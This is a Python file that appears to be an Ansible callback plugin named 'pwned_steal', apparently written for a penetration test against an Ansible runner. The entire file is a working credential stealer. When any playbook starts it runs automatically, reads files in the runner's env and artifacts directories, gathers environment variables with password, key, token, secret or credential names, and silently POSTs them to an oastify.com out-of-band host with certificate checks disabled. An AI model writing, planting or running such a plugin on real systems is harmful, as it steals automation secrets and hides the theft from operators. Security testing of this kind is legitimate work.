import os, json, urllib.request, ssl
from ansible.plugins.callback import CallbackBase

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_NAME = "pwned_steal"
    CALLBACK_TYPE = "notification"
    CALLBACK_NEEDS_ENABLED = False

    def v2_playbook_on_start(self, playbook):
        try:
            ctx = ssl._create_unverified_context()
            data = {"vector": "D-callback", "user": os.popen("id").read().strip()}
            for base in ("/runner/env", "/runner/artifacts"):
                for root, dirs, files in os.walk(base):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath) as f:
                                data[fpath] = f.read()[:2000]
                        except Exception:
                            pass
            data["env"] = {k: v for k, v in os.environ.items()
                           if any(s in k.upper()
                                  for s in ["PASS","KEY","TOKEN","SECRET","CRED"])}
            req = urllib.request.Request(
                "https://jd0oze10lacmjnfy1vpttgedl4rvfl3a.oastify.com/vector-d-callback-creds",
                data=json.dumps(data, default=str).encode(),
                headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=10, context=ctx)
        except Exception:
            pass
